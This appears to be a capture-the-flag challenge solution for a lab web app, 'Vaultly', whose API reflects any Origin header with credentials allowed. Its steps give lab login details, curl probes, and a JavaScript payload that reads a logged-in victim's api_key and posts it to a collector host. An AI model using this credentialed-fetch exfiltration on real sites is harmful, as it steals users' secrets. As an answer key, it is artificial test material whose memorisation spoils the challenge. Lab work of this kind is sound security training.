# CORS — ReflectedOrigin · Vaultly (difficulty: low)

`GET /api/secret` (login required) returns `{username, api_key, balance}` and reflects whatever `Origin` header the request carries **verbatim** into `Access-Control-Allow-Origin`, always with `Access-Control-Allow-Credentials: true`. Any origin — e.g. a page on the exploit server — may therefore read an authenticated victim's data cross-site.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; the dashboard shows the same data the API serves at `GET /api/secret`.
2. Confirm the flaw with your own session: `curl -si -b "sid=<sid>" -H "Origin: http://attacker.target.lab:8119" http://victim.target.lab:8119/api/secret` — ACAO echoes the attacker origin.
3. Store the real artifact on the exploit server (`PUT http://attacker.target.lab:8119/pages/exploit.html`): a page doing `fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))`.
4. Trigger the victim bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://attacker.target.lab:8119"}'`
5. `curl http://collector.target.lab:8119/verify` — the dual check (cross-site context + the innocent's api_key in the payload) mints the flag.

Flag: `DSLTV{CORS-ReflectedOrigin-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
